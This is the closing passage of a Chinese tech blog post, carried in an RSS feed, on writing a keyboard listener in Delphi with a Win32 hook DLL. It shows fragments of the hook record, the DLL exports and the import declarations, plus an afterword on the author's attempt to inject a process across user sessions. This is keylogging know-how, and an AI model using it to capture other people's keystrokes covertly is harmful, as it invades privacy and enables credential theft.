bCapsLock,bNumLock,bShift,bCtrl,bAlt:bool;</span><br><span class="line">               Sender:HWND;</span><br><span class="line">               Time:TDateTime;</span><br><span class="line">             <span class="hljs-keyword">end</span>;</span><br></pre></div></div><p  class="par"> 用于记录按键消息。最后将他们输出：</p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">exports</span></span><br><span class="line">  InstallHook,UnInstallHook,HookProc;</span><br></pre></div></div><p  class="par"> 在主窗体 <code>Main.pas</code> 中写入：</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">InstallHook</span><span class="hljs-params">(hwnd:THandle)</span>;</span><span class="hljs-keyword">stdcall</span>;<span class="hljs-keyword">external</span> <span class="hljs-string">&#x27;Hookdll&#x27;</span>;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">UnInstallHook</span>;</span><span class="hljs-keyword">stdcall</span>;<span class="hljs-keyword">external</span> <span class="hljs-string">&#x27;hookdll&#x27;</span>;<span class="hljs-comment">//静态链接函数</span></span><br></pre></div></div><p  class="par"> 然后调用时用<code>InstallHook(self.Handle);</code>就可以安装钩子了。</p><p >至此一个键盘监听器就写好了（详细参考 CSDN 资源：4428899）</p><h2 id="0x03-后记">0x03 后记</h2><p >但是，这个程序还有一点缺陷，就是不能跨用户监听，即如果一台电脑中有多个用户，则用户 A 的监听器监听不到用户 B 的按键消息。</p><p  class="nomargin"> 我研究过，用户的实质是多个 Desktop（即窗口工作站）同时运行（这也是虚拟桌面的工作原理）。我曾试图用 CreateProcess()这个 API 将一个进程跨用户注入到另一个用户的空间中，虽说成功了，但一旦用户切换用户，所有的钩子都将停止，这也令我很苦恼，如果有兴趣的也可以研究一下。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Delphi/">Delphi</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Win32/">Win32</category>
      
      
      <comments>https://i.hsfzxjy.site/sharing-a-keyboard-hook-in-delphi/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
